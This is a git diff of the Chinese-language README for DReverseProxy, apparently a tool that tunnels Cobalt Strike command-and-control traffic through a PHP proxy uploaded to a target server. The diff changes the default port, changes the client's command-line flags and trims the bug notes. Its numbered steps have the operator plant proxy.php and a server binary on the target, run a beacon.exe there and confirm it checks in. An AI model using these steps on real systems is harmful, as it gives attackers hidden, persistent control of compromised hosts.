@@ -23,18 +23,16 @@ git clone https://github.com/Daybr4ak/DReverseProxy.git
 使用步骤：
 1、将C2script目录下的对应文件，如proxy.php 以及C2ReverseServer上传到目标服务器。
 2、使用C2ReverseServer建立监听端口：
-./C2ReverseServer 8888 (默认为8000)
+./C2ReverseServer  (默认为64535)
 3、修改C2script目录下对应文件的PORT，与C2ReverseServer监听的端口一致。
 4、本地或C2服务器上运行C2ReverseClint工具
-./C2ReverseClint --addr C2IP:C2ListenerPort --target http://example.com/proxy.php (传送到目标服务器上的proxy.php路径)
-5、使用CobaltStrike建立本地Listener(127.0.0.1 8888)端口与C2ReverseServer建立的端口对应
+./C2ReverseClint -t C2IP:C2ListenerPort -u http://example.com/proxy.php (传送到目标服务器上的proxy.php路径)
+5、使用CobaltStrike建立本地Listener(127.0.0.1 64535)端口与C2ReverseServer建立的端口对应
 6、使用建立的Listner生成可执行文件beacon.exe传至目标服务器运行
 7、可以看到CobaltStrike上线。
 ```
 # Bug
 
 一个server端口只支持一个cs上线
-文件上传会导致server阻塞
 
-如果阻塞重启server端就好。。。。  后期准备修改代码重新实现
 
